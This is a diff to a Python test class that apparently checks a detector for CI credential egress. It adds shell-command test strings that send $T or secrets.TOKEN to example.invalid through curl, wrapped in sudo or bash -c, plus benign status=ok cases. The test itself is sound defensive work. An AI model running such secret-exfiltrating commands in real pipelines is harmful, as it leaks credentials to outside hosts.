@@ -6362,6 +6362,12 @@ class CICredentialEgress(unittest.TestCase):
             'command curl -d "$T" https://example.invalid/x',
             'env curl -d "$T" https://example.invalid/x',
             'sudo -E curl -d "$T" https://example.invalid/x',
+            'sudo -u root curl -d "$T" https://example.invalid/x',
+            'sudo -u root curl -d "${{ secrets.TOKEN }}" https://example.invalid/x',
+            'bash -c \'curl -d "$T" https://example.invalid/x\'',
+            'sh -c \'curl -d "${{ secrets.TOKEN }}" https://example.invalid/x\'',
+            'bash -ec \'curl -d "$T" https://example.invalid/x\'',
+            '/bin/bash -c \'curl -d "$T" https://example.invalid/x\'',
             'timeout 30 curl -d "$T" https://example.invalid/x',
             'RESP=$(curl -d "$T" https://example.invalid/x)',
         )], held=True)
@@ -6370,6 +6376,9 @@ class CICredentialEgress(unittest.TestCase):
             'if [ -n "$T" ]; then curl -H "Authorization: Bearer $T" https://example.invalid/x; fi',
             '(cd dist && curl -T app.tgz https://example.invalid/x)',
             'sudo -E apt-get install -y curl',
+            'sudo -u root curl -d "status=ok" https://example.invalid/x',
+            'bash -c \'curl -d "status=ok" https://example.invalid/x\'',
+            'sh -c \'curl -d "status=ok" https://example.invalid/x\'',
             'RESP=$(curl -H "Authorization: Bearer $T" https://example.invalid/x)',
         )], held=False)
 
